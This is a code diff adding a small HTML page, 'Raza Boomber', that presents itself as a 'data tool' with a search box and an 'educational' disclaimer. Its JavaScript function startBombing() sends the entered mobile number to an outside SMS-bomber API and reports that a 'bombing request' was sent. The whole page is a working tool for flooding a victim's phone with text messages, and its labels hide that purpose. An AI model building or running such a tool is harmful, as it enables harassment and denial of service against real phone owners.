@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Raza Boomber</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1 class="title">RAZA DATA<br>TOOL</h1>
+    
+    <div class="box">
+      <input type="text" id="number" placeholder="Enter Mobile e.g. 030000XXXXX" />
+      <button onclick="startBombing()">Search 🔍</button>
+      <p class="hint">Enter number like: 030000XXXXX</p>
+    </div>
+
+    <div class="disclaimer">
+      🚨 <strong>Disclaimer</strong><br>
+      This website is for educational and verification purposes only.<br>
+      We do not promote illegal use of data.
+    </div>
+  </div>
+
+  <script>
+    function startBombing() {
+      const number = document.getElementById('number').value;
+      if (!number || number.length < 10) {
+        alert("Please enter a valid number");
+        return;
+      }
+
+      const fullNumber = number.startsWith("92") ? number : "92" + number.slice(1);
+      
+      fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${fullNumber}`)
+        .then(res => {
+          if (res.ok) {
+            alert("🔥 Bombing request sent!");
+          } else {
+            alert("❌ Failed to send. Try again.");
+          }
+        })
+        .catch(() => alert("🚫 Error occurred. Check connection or number."));
+    }
+  </script>
+</body>
+</html>
